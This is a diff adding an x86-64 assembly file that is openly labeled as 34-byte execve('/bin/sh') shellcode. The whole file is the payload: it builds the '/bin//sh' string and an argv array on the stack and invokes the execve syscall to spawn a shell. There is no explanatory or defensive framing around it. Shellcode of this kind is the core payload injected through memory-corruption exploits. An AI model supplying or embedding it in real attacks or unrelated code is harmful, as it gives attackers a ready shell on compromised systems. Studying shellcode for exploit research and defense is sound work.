@@ -1,0 +1,24 @@
+; x64 execve("/bin/sh", NULL, NULL) shellcode
+; size: 34 bytes
+global _start
+ 
+section .text
+_start:
+    sub rsp, 100            ; keep stack clear / avoid clobbering caller frame
+ 
+    xor rax, rax
+    push rax                 ; NULL terminator
+ 
+    mov rbx, '/bin//sh'      ; "/bin//sh" (8 bytes, double slash pads to align)
+    push rbx
+    mov rdi, rsp              ; rdi = pointer to "/bin//sh"
+ 
+    push rax                  ; argv[1] = NULL
+    push rdi                  ; argv[0] = pointer to "/bin//sh"
+    mov rsi, rsp               ; rsi = argv[]
+ 
+    mov rdx, rax               ; rdx = envp = NULL
+ 
+    mov al, 59                  ; syscall number for execve
+    syscall
+
